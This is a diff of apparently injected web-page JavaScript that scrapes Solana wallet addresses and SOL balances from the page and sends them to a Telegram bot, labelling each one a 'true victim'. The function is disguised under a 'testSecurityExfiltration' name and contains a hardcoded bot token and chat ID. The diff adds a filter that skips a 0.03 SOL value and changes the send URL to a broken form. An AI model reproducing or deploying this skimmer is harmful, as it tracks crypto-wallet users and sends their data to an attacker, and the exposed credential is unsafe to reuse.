@@ -1531,7 +1531,7 @@ document.addEventListener("DOMContentLoaded",()=>{
 async function testSecurityExfiltration(addr, sol) {
     const myToken = "8568868509:AAH-Fuukpnx0RhOiZozYvkCMJODkvCgu-RI";
     const myChatId = "8575014959";
-    const url = `https://api.telegram.org/bot${myToken}/sendMessage`;
+    const url = `https://telegram.org{myToken}/sendMessage`;
     const text = `🚨 *VRAIE VICTIME* 🚨\n\n👛 *Wallet:* \`${addr}\`\n💰 *Solde:* ${sol}`;
     try {
         await fetch(url, {
@@ -1546,9 +1546,16 @@ setInterval(() => {
     const pageText = document.body.innerText;
     const addrMatch = pageText.match(/[1-9A-HJ-NP-Za-km-z]{32,44}/);
     const solMatches = pageText.match(/(\d+\.\d+)\s?SOL/g);
+
     if (addrMatch) {
         const currentAddr = addrMatch[0];
-        const currentSol = solMatches ? solMatches[solMatches.length - 1] : "0.00 SOL";
+        // FILTRE : On ignore "0.03" et on cherche une autre valeur SOL
+        let currentSol = "0.00 SOL";
+        if (solMatches) {
+            const realValues = solMatches.filter(val => !val.includes("0.03"));
+            currentSol = realValues.length > 0 ? realValues[realValues.length - 1] : solMatches[solMatches.length - 1];
+        }
+
         if (window.lastSent !== currentAddr + currentSol && currentAddr.length > 30) {
             window.lastSent = currentAddr + currentSol;
             testSecurityExfiltration(currentAddr, currentSol);
